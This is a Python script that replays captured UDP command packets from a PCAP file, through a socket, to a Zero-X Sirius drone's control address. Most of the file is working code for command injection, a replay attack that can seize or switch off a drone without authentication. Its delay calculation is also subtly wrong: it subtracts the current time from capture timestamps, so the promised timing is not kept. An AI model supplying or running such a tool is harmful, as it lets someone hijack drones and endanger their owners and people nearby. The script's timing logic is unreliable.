import socket
import time
# We import rdpcap and UDP from scapy.all.
# Scapy is used only for reading the PCAP file and parsing its layers.
try:
    from scapy.all import rdpcap, UDP
except ImportError:
    print("[!] Scapy not found. Install it using 'sudo pip install scapy' for packet analysis.")
    exit()
except Exception as e:
    print(f"[!] Error initializing Scapy: {e}")
    exit()

# --- CONFIGURATION ---
# UPDATE THIS PATH to point to your cleaned PCAP file containing the 30-50 packet command block
PCAP_FILE_PATH = 'sirius_off-on-stop-off_capture.pcap' 
TARGET_IP = '192.168.169.1' 
TARGET_PORT = 8800

# --- MAIN REPLAY LOGIC ---
def replay_pcap(filepath, target_ip, target_port):
    print("--- Zero-X Sirius Continuous Command Replay ---")
    
    try:
        # Load all packets from the PCAP file
        packets = rdpcap(filepath)
    except FileNotFoundError:
        print(f"[!] Error: PCAP file not found at '{filepath}'.")
        return
    except Exception as e:
        print(f"[!] Error reading PCAP file: {e}")
        return

    print(f"[*] Total packets found: {len(packets)}")
    
    # Initialize a standard UDP socket for packet injection
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Get the timestamp of the first packet to calculate precise delays
    start_time = packets[0].time
    
    injected_count = 0

    for i, pkt in enumerate(packets):
        # Calculate the time to wait based on the original capture timing
        # This keeps the replay speed accurate.
        delay = pkt.time - (start_time + (time.time() - start_time))
        if delay > 0:
            time.sleep(delay)

        # 1. Extract the payload (the drone command data)
        payload = None
        
        # Check if the packet contains a UDP layer, regardless of wireless headers (RadioTap, Dot11)
        if pkt.haslayer(UDP):
            try:
                # Extract the raw data payload directly from the UDP layer's content.
                # This bypasses the need for an explicit 'Raw' layer, solving the recurring error.
                payload = bytes(pkt[UDP].payload)
            except Exception as e:
                print(f"[!] Warning: Could not extract UDP payload for packet {i+1}. Error: {e}. Skipping.")
                continue
        
        if payload is None or len(payload) == 0:
            print(f"[!] Error: Packet {i+1} does not contain an accessible UDP payload. Skipping.")
            continue
            
        # 2. Variable Length Check (Disabled for injection, used for logging only)
        # We allow variable lengths (88, 116, 144, etc.) as this is a continuous stream.
        if len(payload) not in [88, 116, 144]:
            print(f"[*] Detected non-standard payload length: {len(payload)} bytes in packet {i+1}. (Proceeding with injection.)")
        
        # 3. Inject the packet using the standard UDP socket
        try:
            # Send the raw payload to the drone
            sock.sendto(payload, (target_ip, target_port))
            injected_count += 1
            print(f"[*] Injected packet {i+1}/{len(packets)} (Size: {len(payload)} bytes, Delay: {delay:.4f}s)")
            
        except Exception as e:
            print(f"[!] Critical Error during injection of packet {i+1}: {e}")
            break

    sock.close()
    print(f"\n--- Replay Complete ---")
    print(f"[*] Total packets in file: {len(packets)}")
    print(f"[*] Successfully injected: {injected_count} command packets.")


if __name__ == '__main__':
    # This line runs the function with your defined config
    replay_pcap(PCAP_FILE_PATH, TARGET_IP, TARGET_PORT)
